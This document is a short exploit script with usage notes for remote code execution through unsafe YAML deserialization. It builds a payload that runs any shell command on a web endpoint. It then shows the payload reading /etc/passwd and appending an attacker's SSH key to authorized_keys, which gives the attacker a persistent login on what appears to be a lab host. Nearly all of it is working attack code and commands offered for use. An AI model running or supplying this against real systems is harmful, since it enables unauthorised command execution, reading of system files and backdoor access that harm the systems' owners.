
```
#!/usr/bin/env python3
import yaml
import subprocess
from base64 import b64encode
import requests
import sys

class RCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return subprocess.run, (self.command, {"capture_output": True, "text": True})


def craft_exploit(obj):
    # Convert the object to a YAML string
    stuff = yaml.dump(obj).encode()
    # Encode the YAML string in base64
    return b64encode(stuff).decode()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target URL> <command>")
        sys.exit(1)
    
    target = sys.argv[1]
    command_str = sys.argv[2]
    
    # Split the command string into a list of arguments
    command = command_str.split()

    # Create an RCE object with the command to be executed
    payload = target + "?yaml=" + craft_exploit(RCE(command))
    
    # Send the GET request to the target with the payload
    r = requests.get(payload)
    
    # Print the response text
    print(r.text)
```

Simple Command:

```python3 exploit.py "http://10.10.110.101:5000/search" "cat /etc/passwd"```

Generate RSA Key Pair

```ssh-keygen -t rsa -b 2048 -f mykey```

Run the Exploit Script to append the public key

```
python3 exploit.py "http://10.10.110.101:5000/search" "bash -c 'echo $(cat mykey.pub) >> ~/.ssh/authorized_keys'"
```

Finally run 

```ssh -i mykey user@target-ip```